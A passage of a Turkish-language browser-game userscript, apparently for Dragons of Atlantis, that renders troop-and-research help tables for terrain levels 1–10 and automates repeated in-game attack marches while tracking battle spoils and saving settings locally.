		m += '<TR><TD></td><TD><center>50 Minotaur + 50 Hamal</center></td><TD><center><img src="'+ s1 +'"></center></td><TD><center>Metalürüji: 1 Tıp: 0 Kalibrasyon: 0</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 6 Tıp: 6 Dragon Bilimi: 3</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><b><center>2</center></b></td><TD><center>100 Minotaur</center></td><TD><center><img src="'+ s2 +'"></center></td><TD><center>Metalürüji: 2 Tıp: ? Kalibrasyon: 2</center></Td></tr>';
		m += '<TR><TD></td><TD><center>50 Baltacı + 100 Minotaur + 100 Hamal</center></td><TD><center><img src="'+ s3 +'"></center></td><TD><center>Metalürüji: 2 Tıp: 2 Kalibrasyon: 2</center></Td></tr>';
		m += '<TR><TD></td><TD><center>15 Okçu + 9 Hamal</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 2 Tıp: ? Kalibrasyon: 2</center></Td></tr>';
		m += '<TR><TD></td><TD><center>45 Minotaur</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 2 Tıp: ? Kalibrasyon: 2</center></Td></tr>';
		m += '<TR><TD></td><TD><center>50 ÇAD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 3 Tıp: 0 Dragon Bilimi: 3</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><b><center>3</center></b></td><TD><center>136 Okçu</center></td><TD><center><img src="'+ s1 +'"></center></td><TD><center>Metalürüji: 1 Tıp: 1 Kalibrasyon: 1</center></Td></tr>';
		m += '<TR><TD></td><TD><center>53 Okçu</center></td><TD><center><img src="'+ s1 +'"></center></td><TD><center>Metalürüji: 2 Tıp: 0 Kalibrasyon: 2</center></Td></tr>';
		m += '<TR><TD></td><TD><center>25 Okçu + 5 Zeplin </center></td><TD><center><img src="'+ s4 +'"></center></td><TD><center>Metalürüji: 2 Tıp: ? Kalibrasyon: 2</center></Td></tr>';
		m += '<TR><TD></td><TD><center>50 Minotaur + 50 Okçu + 25 Hamal</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 2 Tıp: 0 Kalibrasyon: 1</center></Td></tr>';
		m += '<TR><TD></td><TD><center>5 Hamal + 55 Minotaur + 20 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 2 Tıp: 2 Kalibrasyon: 2</center></Td></tr>';
		m += '<TR><TD></td><TD><center>10 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 5 Tıp: 5 Dragon Bilimi: 5</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';

		m += '<TR><TD><b><center>4</center></b></td><TD><center>104 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 2 Tıp: 0 Kalibrasyon: 2</center></Td></tr>';
		m += '<TR><TD></td><TD><center>80 Okçu + 10 Hamal</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 2 Tıp: ? Kalibrasyon: 1</center></Td></tr>';
		m += '<TR><TD></td><TD><center>500 ÇAD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 2 Tıp: 2 Dragon Bilimi: ?</center></Td></tr>';
		m += '<TR><TD></td><TD><center>210 Minotaur + 200 ÇAD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 2 Tıp: ? Kalibrasyon: 2 Dragon Bilimi: ?</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';

		m += '<TR><TD><b><center>5</center></b></td><TD><center>50 Minotaur + 973 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 1 Tıp: 0 Kalibrasyon: 3</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1250 Okçu + 40 Minotaur</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 2 Tıp: ? Kalibrasyon: 3</center></Td></tr>';
		m += '<TR><TD></td><TD><center>300 Okçu + 22 Zırhlı sevkiyat</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 3 Tıp: 1 Kalibrasyon: 4</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1150 Minotaur + 300 Okçu + 500 SD</center></td><TD><center><img src="'+ s3 +'"></center></td><TD><center>Metalürüji: 5 Tıp: 2 Kalibrasyon: 2 Dragon Bilimi: 4</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1200 ÇAD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 6 Tıp: 5 Dragon Bilimi: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>400 ÇAD + 600 SD + 200 Zeplin</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalürüji: 6 Tıp: 5 Dragon Bilimi: 8</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';

  var pop = new CPopuppa ('giftHelp', 0, 0, 830, 800, true);
  pop.centerMe (mainPop.getMainDiv());
  pop.getMainDiv().innerHTML = m;
  pop.getTopDiv().innerHTML = '<CENTER><FONT COLOR=#FFFFFF><B>EasyMaster Taktik 1-5</b></center>';
  pop.show (true);
  },
 
 
   /***TABELLE TERRE 6-10***/

  helpPopT2 : function (){ // TODO: Translate
		var stTitle = 'background-color: #2BB524; font-weight:bold;text-align:center; color:#ffffff;';
        var stTitle2 = 'background-color: #2BB524; font-weight:bold;';
		var stTitle3 = 'background-color: #2BB524; font-weight:bold;text-align:center; color:#ffffff;';
        var s0 = 'http://img62.imageshack.us/img62/1582/16857792.gif';
        var s1 = 'http://img683.imageshack.us/img683/8149/31096760.gif';
        var s2 = 'http://img706.imageshack.us/img706/1485/40621535.gif';
        var s3 = 'http://img148.imageshack.us/img148/9913/21372285.gif';
        var s4 = 'http://img90.imageshack.us/img90/1061/24344413.gif';
        var s5 = 'http://img691.imageshack.us/img691/3886/85305366.gif';

		var m = '';
		m += '<TABLE width=100% bgcolor=#ffffd0><TR><TD colspan=4 align=center style="' + stTitle + '">Bu Tablo Darkous Tarafından KoC Wiki Sitesinden Alınan Bilgilerce Hazırlanmıştır..<BR></td></tr>';
  	m += '<TABLE width=100% bgcolor=#ffffff><TR><TD colspan=4 align=center style="' + stTitle2 + '"><A target="_tab" href="http://www.facebook.com/DoaPowerTools">Daha Fazlası İçin Buraya Tıkla</a></td></tr>';
  	m += '<TABLE width=100% bgcolor=#ffffd0><TR><TD colspan=4 align=center style="' + stTitle3 + '"><A target="_tab" href="http://www.facebook.com/DoaPowerTools">Sorunların İçin Buraya Tıkla ve Mesaj At..</a></td></tr>';
	m += '<TR><TD> </td><TD></td><TD></TD></tr>';
	
  	m += '<TR><TD><b><center>Level</center></b></td><TD><center>Asker</center></td><TD><center>General</center></td><TD><center>Araştırma Levelleri</center></td></tr>';
		m += '<TR><TD> </td><TD></td><TD></td></tr>';		
		
		m += '<TR><TD><b><center>6</center></b></td><TD><center>1250 Okçu</center></td><TD><center><img src="'+ s3 +'"></center></td><TD><center>Metalüriji: 2 Tıp: 0 Kalibrasyon: 3</center></Td></tr>';
		m += '<TR><TD></td><TD><center>950 Okçu + 70 Zeplin</center></td><TD><center><img src="'+ s3 +'"></center></td><TD><center>Metalüriji: 2 Tıp: 0 Kalibrasyon: 3</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1200 Okçu + 30 Minotaur</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 2 Tıp: 1 Kalibrasyon: 3</center></Td></tr>';
		m += '<TR><TD></td><TD><center>750 Okçu + 190 Minotaur</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 5 Tıp: 5 Kalibrasyon: 5</center></Td></tr>';
		m += '<TR><TD></td><TD><center>770 Okçu + 180 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 5 Tıp: 5 Kalibrasyon: 5 Dragon Bilimi: 5</center></Td></tr>';
		m += '<TR><TD></td><TD><center>2400 ÇAD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 9 Tıp: 8 Dragon Bilimi: 9</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1600 ÇAD + 500 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 4 Tıp: 5 Dragon Bilimi: 4</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><b><center>7</center></b></td><TD><center>1700 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 4 Tıp: 4 Kalibrasyon: 5</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1000 SD + 30 Okçu + 100 Zeplin</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 5 Tıp: 6 Dragon Bilimi: 6</center></Td></tr>';
		m += '<TR><TD></td><TD><center>3100 ÇAD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 6 Tıp: 5 Dragon Bilimi: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1 Taş Dragonu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 10 Tıp: 9 Kalibrasyon: 10 Dragon Bilimi: 9</center></Td></tr>';
		m += '<TR><TD></td><TD><center>100 S.Semplice + 37 Baltacı + 118 Minotaur + 564 ÇAD + 447 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 4 Tıp: 4 Dragon Bilimi: 4</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1600 ÇAD + 500 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 4 Tıp: 5 Dragon Bilimi: 4</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><b><center>8</center></b></td><TD><center>3000 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 6 Tıp: 7 Kalibrasyon: 6</center></Td></tr>';
		m += '<TR><TD></td><TD><center>4500 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 5 Tıp: 5 Kalibrasyon: 5</center></Td></tr>';
		m += '<TR><TD></td><TD><center>4719 Okçu 102 Zeplin</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 4 Tıp: 5 Kalibrasyon: 5</center></Td></tr>';
		m += '<TR><TD></td><TD><center>4500 ÇAD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 6 Tıp: 5 Dragon Bilimi: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>2136 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 8 Tıp: 9 Dragon Bilimi: 8</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><b><center>9</center></b></td><TD><center>5500 Okçu + 40 Zeplin</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 6 Tıp: 5 Kalibrasyon: 5</center></Td></tr>';
		m += '<TR><TD></td><TD><center>5500 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 8 Tıp: 7 Kalibrasyon: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>11000 ÇAD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 6 Tıp: 5 Dragon Bilimi: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>11600 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 8 Tıp: 8 Kalibrasyon: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>9000 ÇAD + 4500 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 7 Tıp: 6 Kalibrasyon: 6 Dragon Bilimi: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>1000 ÇAD + 3000 SD + 500 Zeplin</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 7 Tıp: 6 Kalibrasyon: 6 Dragon Bilimi: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>5750 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 6 Tıp: 6 Dragon Bilimi: 6</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';

		m += '<TR><TD><b><center>10</center></b></td><TD><center>25000 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 9 Tıp: 8 Kalibrasyon: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>5000 Giganti</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 9 Tıp: 8 Kalibrasyon: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>15000 ÇAD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 9 Tıp: 8 Dragon Bilimi: 9</center></Td></tr>';
		m += '<TR><TD></td><TD><center>11600 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 8 Tıp: 8 Kalibrasyon: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>9000 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 9 Tıp: 9 Kalibrasyon: 9 Dragon Bilimi: 9</center></Td></tr>';
		m += '<TR><TD></td><TD><center>28000 Okçu + 1 Gran Drago</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 8 Tıp: 8 Kalibrasyon: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>15000 SD</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 8 Tıp: 9 Kalibrasyon 7 Dragon Bilimi: 8</center></Td></tr>';
		m += '<TR><TD></td><TD><center>20000 Okçu</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 9 Tıp: 9 Kalibrasyon: 9</center></Td></tr>';
		m += '<TR><TD></td><TD><center>30000 Okçu + 500 Zeplin</center></td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Metalüriji: 7 Tıp: 7 Kalibrasyon: 6 Hızlı Sevkiyat: 6</center></Td></tr>';
		m += '<TR><TD> </td><TD></td><TD></TD></tr>';

  var pop = new CPopuppa ('giftHelp', 0, 0, 830, 1500, true);
  pop.centerMe (mainPop.getMainDiv());
  pop.getMainDiv().innerHTML = m;
  pop.getTopDiv().innerHTML = '<CENTER><FONT COLOR=#FFFFFF><B>EasyMaster Taktik 6-10</b></center>';
  pop.show (true);
  },

 
 
  
  resetStats : function (){
    var t = Tabs.Waves;
    var now = serverTime();
    t.curRunStart = now;
    Data.options.waves.numAttacks = 0;
    Data.options.waves.runTime = 0;
    for (var i=0; i<5; i++)
      Data.options.waves.targets[i].stats = {numAttacks:0, spoils:{}};
    t.dispStats();
  },
  
  dispStats : function (){
    var t = Tabs.Waves;
    var runTime = Data.options.waves.runTime;
    if (Data.options.waves.enabled)
      runTime += (serverTime()-t.curRunStart);
    var msg = '<TABLE class=pbTabPad width=100%><TR><TD class=pbTabLeft>'+translate( 'Calisma Suresi' )+':</td><TD width=90%>'+ timestr(runTime, true) +'</td></tr>\
        <TR><TD class=pbTabLeft>'+translate( 'Saldirilar' )+':</td><TD>'+ Data.options.waves.numAttacks +'</td></tr>\
        <TR><TD colspan=2><HR class=thin></td></tr>';
    for (var p in  Data.options.waves.targets[0].stats.spoils){
      var num = Data.options.waves.targets[0].stats.spoils[p];
      var perHour = num / (runTime/3600);
      var item = Names.itemAbbr(p);
      msg += '<TR><TD class=pbTabLeft>'+ translate( item ) +':</td><TD>'+ num +' ('+ perHour.toFixed(2) +' '+translate( 'per hour' )+')</td></tr>';
    }
    document.getElementById('pbwaveStats').innerHTML = msg + '</table>';
  },
  
  dispFeedback : function (msg){
    if (msg && msg!='')
      msg = new Date().toTimeString().substring (0,8) +' '+ msg;
    document.getElementById('pbwaveFeedback').innerHTML = msg;
  },
  
  eventTroops : function (e){
    var t = Tabs.Waves;
    var args = e.target.name.split ('_');
    if (args[0] == 'AW'){
      var tr = Data.options.waves.targets[0].troopsWave2;
      var tt = Names.troops.byAbbr[t.troopList[args[1]]][1];
      tr[tt] = e.target.value;
    }
  },

  setWaveEnable : function (onOff){
    var t = Tabs.Waves;
    var but = document.getElementById('pbwaveEnable');
    clearTimeout (t.attackTimer);
    Data.options.waves.enabled = onOff;
    if (onOff){
      but.value = translate( 'Spam Acik' );
      but.className = 'butAttackOn';
      t.waveAttackTick();
      t.curRunStart = serverTime();
    } else {
      but.value = translate( 'Spam Kapali' );
      but.className = 'butAttackOff';
      if (t.curRunStart != 0)
        Data.options.waves.runTime += (serverTime()-t.curRunStart);
    }
  },
  
  onUnload : function (){
    var t = Tabs.Waves;
    if (Data.options.waves.enabled && t.curRunStart!=0)
      Data.options.waves.runTime += (serverTime()-t.curRunStart);
  },
  
  
  waveAttackTick : function (){
    var t = Tabs.Waves;
    clearTimeout (t.attackTimer);
//logit ('waveAttackTick');
if (Ajax.marchBusy>0){
logit ('waveAttackTick: marchBusy *********************************************************************');
  t.attackTimer = setTimeout (t.waveAttackTick, 1000);
  return;
}    
if (!Data.options.waves.enabled)
  return;
      
    var target = Data.options.waves.targets[0];
    var now = serverTime();
    var cityIdx = 0;
    var targMsg =  target.targetX +','+ target.targetY +' '+translate( 'Lvl' )+' '+ target.terrainLevel +' '+ translate(target.terrainType);
    var gen = null;
    if (getMusterPointSlots (cityIdx) <= 0){
      t.dispFeedback ( translate( 'Ictima Alani Dolu') );
      t.attackTimer = setTimeout (t.waveAttackTick, 5000);
      return;
    }
    var marchCount = 0;
    for (var p in Seed.marches)
    if (Seed.marches[p].ownerId == 'wave')
    ++marchCount;
    if (marchCount >= Data.options.waves.maxMarches){
    t.dispFeedback ( translate( 'Ictima Alani Dolu') );
    t.attackTimer = setTimeout (t.waveAttackTick, 5000);
    return;
    } 
//logit (inspect (Seed.generals, 8, 1));    
    if ((gen = getAvailableGeneral ()) == null){
      t.dispFeedback ('General Kullanılamaz');
      t.attackTimer = setTimeout (t.waveAttackTick, 5000);
      return;
    }
//logit ('WAVE General: '+ inspect (gen, 6, 1));    
    var msg;
    if ((msg = t.checkTroops (cityIdx, target.troopsWave2)) != null){
      t.dispFeedback (msg);
      t.attackTimer = setTimeout (t.waveAttackTick, 5000);
      return;
    }
    
    // ok, send wave attack ...
    t.dispFeedback ( translate( 'Saldiri Yollandi:' )+' '+ targMsg);
    new Ajax.march (Seed.s.cities[cityIdx].id, target.targetX, target.targetY, gen.id, target.troopsWave2, 'wave', function (rslt){
        var t = Tabs.Waves;
        if (rslt.ok && rslt.dat.result.success){
          t.attackErrors = 0;
          target.lastAttack = serverTime();
          actionLog ( translate( 'Spam Saldirisi Yollandi:' )+' '+ targMsg);
          var delay = Data.options.waves.iterationMin + parseInt((Math.random()*(Data.options.waves.iterationMax-Data.options.waves.iterationMin)));
          t.attackTimer = setTimeout (t.waveAttackTick, delay*1000);
        } else {
          t.dispFeedback ('Hata: '+ rslt.errmsg);
          actionLog ('Saldiri Hatasi: '+ rslt.errmsg);
          if (t.attackErrors++ > 3){
            t.setWaveEnable (false);
            if (notify)
              notify (false);
          } else {
            t.attackTimer = setTimeout (t.waveAttackTick, 10000);
          }
        }
    });
  },

  // returns null if ok, else error message
  checkTroops : function (cityIdx, troops){
    var totTroops = 0;
    for (var p in troops){
      if (troops[p] > 0){
        totTroops += troops[p];
        if (Seed.s.cities[cityIdx].units[p] < troops[p]){
          return ( translate( 'Not enough' ) +' '+translate(p));
        }
      }
    }
    if (totTroops <= 0){
      return translate( 'Asker Tanımsız' );
    }
    return null;
  },
  
   marchTick : function (){
    var t = Tabs.Waves;
    clearTimeout (t.marchTimer);
    document.getElementById('pbwaveMarches').innerHTML = marchTable('wave');
    t.marchTimer = setTimeout (t.marchTick, 2000);
  },

  eventCoords : function (e){
    var ex = document.getElementById('pbwaveX');
    var ey = document.getElementById('pbwaveY');
    var x = parseIntZero (ex.value);
    var y = parseIntZero (ey.value);
    ex.value = x;
    ey.value = y;
    Data.options.waves.targets[0].targetX = x;
    Data.options.waves.targets[0].targetY = y;
    document.getElementById('pbwaveDist').innerHTML = distance(Seed.s.cities[0].x, Seed.s.cities[0].y, x, y);
    document.getElementById('pbwaveTile').innerHTML = '  ';
    if (x<0 || x>749){
      ex.style.backgroundColor = 'red';
      return;
    }
    if (y<0 || y>749){
      ey.style.backgroundColor = 'red';
      return;
    }
    ey.style.backgroundColor = '';
    ex.style.backgroundColor = '';
    Map.scanMapCirc (x, y, 1, callback, true);
    function callback (rslt){
      var tile = null;
      for (var i=0; i<rslt.tiles.length; i++){
        if (rslt.tiles[i].x==x && rslt.tiles[i].y==y){
          tile = rslt.tiles[i];
          break;
        }
      }
      if (!tile)
        return;
      Data.options.waves.targets[0].terrainType = Map.names[tile.type];
      Data.options.waves.targets[0].terrainLevel = tile.lvl;
      document.getElementById('pbwaveTile').innerHTML = '<B>'+ translate( Map.names[tile.type] ) + ' ' + translate( 'level' )+ ' ' + tile.lvl +'</b>';
    }
  },
 
 
  show : function () {
    var t = Tabs.Waves;
    t.marchTick();
  },
  hide : function (){
    var t = Tabs.Waves;
    clearTimeout (t.marchTimer);
  },
}



var Data = {
  isChrome : navigator.userAgent.toLowerCase().indexOf('chrome') > -1,
  cookieName : 'Kabamfuck',
  serverID : getServerId(),
  names : [],
  
  init : function (list){
    var t = Data;
    for (var p in list){
      t[p] = t.readMergeOptions (p, list[p]);
      t.names.push(p);
    }
  },

  onUnload : function (){
    var t = Data;
    logit ('===========  Data.onUnload');
    for (var i=0; i<t.names.length; i++)
      if (t.isChrome){
        localStorage.setItem(t.names[i], JSON2.stringify(t[t.names[i]]));
      }else{
        GM_setValue (t.names[i] +'_'+ t.serverID, JSON2.stringify(t[t.names[i]]));
      }
  },
  
  // TODO: recurse, don't modify defaults
  readMergeOptions : function (label, defaults){
    var t = Data;
    var s;
logit ('===========  Load preference');
//alert("LOAD");
    if (t.isChrome)
        s = localStorage.getItem(label);
    else
      s = GM_getValue (label +'_'+ t.serverID);
    if (s == null)
      return defaults;
    if (s != null){
      opts = JSON2.parse (s);
//logit ('readmerge: '+ inspect (opts, 5, 1));    
      if (matTypeof(defaults)=='array')
        defaults = defaults.concat(opts);
      else if (matTypeof(opts)=='object'){
        for (k in opts)
          defaults[k] = opts[k];
      }
    }
    return defaults;
  },
  
  getCookie : function (name){
    var i = document.cookie.indexOf(name+'=');
    if (i < 0)
      return null;
    var ii = document.cookie.indexOf(';', i);
    if (ii<0)
      ii = document.cookie.length;
    return unescape(document.cookie.substring(i+name.length+1, ii));
  },
}




Tabs.AutoAttack = {
  tabOrder : ATTACK_TAB_ORDER,
  tabLabel : gAnt,
  tabDisabled : false,
  cont : null,
  attackTimer: null,
  marchTimer: null,
  lastAttack : 0,
  attackErrors : 0,
  checkMapBusy : false,
  MAX_DISTANCE : 35,
  curRunStart : 0,
  
  init : function (div){
    var t = Tabs.AutoAttack;
    t.cont = div;
    if (!Data.options.campAttack.troops){
      Data.options.campAttack.troops = [];
      for (var x=1; x<=10; x++)
        Data.options.campAttack.troops[x] = {};
    } // TODO: Translate
    div.innerHTML = '<DIV class=pbTitle>'+translate( 'Oto Antropus Sekmesi' )+'</div>\
      <DIV class=pbStatBox id=pbatStatus style="margin-bottom:5px !important">\
      <CENTER><INPUT type=submit value="OnOff" id=pbatEnable></input></center>\
      <DIV id=pbatMarches style="height:165px; max-height:165px; overflow-y:auto;"></div>\
      <DIV id=pbatFeedback style="height: 17px; border: 1px solid #AA00FF; background-color:#6B6258; padding: 2px 0px; text-align:center; font-weight:bold"></div></div>\
      <TABLE width=100% bgcolor=#FCDC26 align=center><TR><TD>\
      <INPUT type=submit value="'+translate( 'Level' )+'" id=pbatConfigL></input>\
      <INPUT type=submit value="'+translate( 'Yapilandirma' )+'" id=pbatConfigG></input>\
      <INPUT type=submit value="'+translate( 'Hedefler' )+'" id=pbatTargets></input>\
      <INPUT type=submit value="'+translate( 'Bilgiler' )+'" id=pbatStats></input>\
      <INPUT type=submit value="'+translate( 'Antropus 1-5' )+'" id=pbatAcc></input>\
     <INPUT type=submit value="'+translate( 'Antropus 6-10' )+'" id=pbatAcc2></input></td></tr></table>\
      <DIV id=pbatmContent style="padding-top:5px; height:580px; max-height:580px; width:483px; overflow-y:auto; background-color:#FCDC26;"></div>';
    document.getElementById('pbatEnable').addEventListener ('click', function (){t.setAttackEnable (!Data.options.campAttack.enabled);}, false);
    document.getElementById('pbatConfigL').addEventListener ('click', t.tabConfigLevels, false);
    document.getElementById('pbatConfigG').addEventListener ('click', t.tabConfigGeneral, false);
    document.getElementById('pbatTargets').addEventListener ('click', t.tabTargets, false);
    document.getElementById('pbatStats').addEventListener ('click', t.tabStats, false);
    document.getElementById('pbatAcc').addEventListener ('click', t.helpPopA, false);
    document.getElementById('pbatAcc2').addEventListener ('click', t.helpPopA2, false);
    if (Data.options.campStats == null)
      t.clearStats();
    if (Data.options.campAttack.maxMarches == undefined)
      Data.options.campAttack.maxMarches = 10;
    Messages.addBattleReportListener(t.gotBattleReport);
    setTimeout (t.checkMarches, 60000); 
    t.tabConfigLevels();
    window.addEventListener ('unload', t.onUnload, false);
    t.setAttackEnable (Data.options.campAttack.enabled);
    for (var p in Data.options.campMarches){
      if (Seed.marches[Data.options.campMarches[p].id])
        Seed.marches[Data.options.campMarches[p].id].ownerId = 'camp';
    }    
  },

  firstShow : true,
  show : function () {
    var t = Tabs.AutoAttack;
    t.marchTick();
    if (t.firstShow){
      t.marchTick();
      setTimeout (function (){
        t.checkMapData ();
        t.firstShow = false;
      }, 0);
    }
  },
  hide : function (){
    var t = Tabs.AutoAttack;
    clearTimeout (t.marchTimer);
  },

  onUnload : function (){
    var t = Tabs.AutoAttack;
    logit ('===============  Tabs.AutoAttack.onUnload');
    if (Data.options.campAttack.enabled)
      Data.options.campStats.runTime += (serverTime()-t.curRunStart);
  },
  
  addMarch : function (job){
    var t = Tabs.AutoAttack;
    var march = Seed.marches[job.march_id];
    if (march == null){
      logit ('***** March missing from seed: '+ job.march_id); 
      if (DEBUG_MARCHES) WinLog.write ('***** ERRROR march missing from seed: '+ job.march_id);   
    } else {
      Data.options.campMarches[job.march_id] = cloneProps(march);
      if (DEBUG_MARCHES) WinLog.write ('Tabs.AutoAttack.addMarch: ID='+ march.id +'  ('+ march.x +','+ march.y +') Generale:'+ march.general.id);    
    }
  },
  removeMarch : function (mid){   
    var t = Tabs.AutoAttack;
    delete (Data.options.campMarches[mid]);
  },
  marchCheckTimer : null,
  checkMarches : function (){
    var t = Tabs.AutoAttack;
    var now = serverTime();
    clearTimeout (t.marchCheckTimer);
    for (var p in Data.options.campMarches){
      if (parseInt(Data.options.campMarches[p].run_at) < (now-40)){
        if (Data.options.campMarches[p].retry){
          ++Data.options.messages.missing;
          logit ('March report never received! (now='+ now +')\n'+ inspect (Data.options.campMarches[p], 6, 1));    
          if (DEBUG_MARCHES) WinLog.write ('March report never received! (now='+ now +')\n'+ inspect (Data.options.campMarches[p], 6, 1));    
          t.removeMarch (p);
        } else {
          Data.options.campMarches[p].retry = true;
          Messages.checkMessages();
        }
      }
    }
    t.marchCheckTimer = setTimeout (t.checkMarches, 30000);
  },
  
  trackStats : function (marchId, rpt){   // called when battle report received
    var t = Tabs.AutoAttack;
if (DEBUG_MARCHES) WinLog.write ('Tabs.AutoAttack.trackStats: '+ marchId); 
    var campLevel = rpt.report.location.level;
    if (campLevel<1 || campLevel>11)
      campLevel = 0;
    ++Data.options.campStats.numAttacks;
    ++Data.options.campStats.byLevel[campLevel].numAttacks;
    var res =  rpt.report.spoils.resources;
    for (var p in res){
      objAddTo (Data.options.campStats.resources, p, parseInt(res[p]));
      objAddTo (Data.options.campStats.byLevel[campLevel].resources, p, parseInt(res[p]));
    }  
    var items =  rpt.report.spoils.items;
    for (var i=0; i<items.length; i++){
      objAddTo (Data.options.campStats.items, items[i], 1);
      objAddTo (Data.options.campStats.byLevel[campLevel].items, items[i], 1);
    }  
    t.removeMarch (marchId);
    t.showStats();    
  },

  showStats : function (){
    var t = Tabs.AutoAttack;
    var div = document.getElementById('pbcampSO');
    if (div==null)
      return;
    var runTime = Data.options.campStats.runTime;
    if (Data.options.campAttack.enabled)
      runTime += (serverTime()-t.curRunStart);
    var m = '<TABLE class=pbTabPad> <TR><TD class=pbTabLeft>'+translate( 'Stats started at' )+':</td><TD>'+  new Date(Data.options.campStats.tsStart * 1000).myString() +'</td></tr>\
    <TR><TD class=pbTabLeft>'+translate( 'Calisma Suresi' )+':</td><TD>'+ timestr(runTime, true) +'</td></tr>\
    <TR><TD class=pbTabLeft>'+translate( 'Saldirilar' )+':</td><TD>'+ Data.options.campStats.numAttacks +'</td></tr>\
    <TR valign=top><TD class=pbTabLeft>'+translate( 'Resources' )+':</td><TD><TABLE class=pbTabPad>';
    for (var p in Data.options.campStats.resources){
      var perHour = Data.options.campStats.resources[p] / (runTime/3600);
      m += '<TR align=right><TD>'+ translate( p ) +':</td><TD>'+ addCommasInt(Data.options.campStats.resources[p]) +'</td><TD>('+ addCommasInt(perHour) +' /'+translate( 'hr' )+')</td></tr>';
    }
    m += '</table></td></tr></table>';
    
